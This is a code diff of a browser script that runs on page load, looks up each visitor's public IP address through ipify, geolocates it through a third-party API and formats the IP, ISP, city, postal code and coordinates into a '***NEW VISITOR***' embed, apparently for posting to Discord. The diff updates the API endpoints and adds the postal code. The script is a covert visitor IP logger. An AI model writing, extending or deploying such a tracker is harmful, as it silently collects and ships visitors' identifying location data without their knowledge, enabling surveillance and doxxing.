@@ -1,12 +1,12 @@
 document.addEventListener('DOMContentLoaded', () => {
-  fetch('https://api.ipify.org?format=json')
+  fetch('https://api64.ipify.org?format=json')
     .then(response => response.json())
     .then(data => {
       const ipAddress = data.ip;
       const currentDateTime = new Date();
       const dateTimeString = currentDateTime.toLocaleString();
 
-      fetch(`https://ip-api.com/json/${ipAddress}`)
+      fetch(`https://ipapi.co/${ipAddress}/json/`)
         .then(response => response.json())
         .then(geoData => {
           const message = createMessage(ipAddress, dateTimeString, geoData);
@@ -22,7 +22,7 @@ document.addEventListener('DOMContentLoaded', () => {
 
 
 function createMessage(ipAddress, dateTimeString, geoData) {
-  const { query, isp, country, regionName, city, zip, lat, lon } = geoData;
+  const { ip, isp, country_name, region, city, postal, latitude, longitude } = geoData;
 
   const message = {
     embeds: [
@@ -30,14 +30,15 @@ function createMessage(ipAddress, dateTimeString, geoData) {
         title: '***NEW VISITOR***',
         color: 16776960, // Yellow color
         description: `
-          IP Address: ${query}
+          IP Address: ${ip}
           Date and Time: ${dateTimeString}
           ISP: ${isp}
-          Country: ${country}
-          Region: ${regionName}
+          Country: ${country_name}
+          Region: ${region}
           City: ${city}
-          Latitude: ${lat}
-          Longitude: ${lon}
+          Postal Code: ${postal}
+          Latitude: ${latitude}
+          Longitude: ${longitude}
         `,
         thumbnail: {
           url: 'https://cdn.discordapp.com/attachments/1008763573029306519/1112393554585718867/1075892497257091092.png' // Customize the URL of the preview image
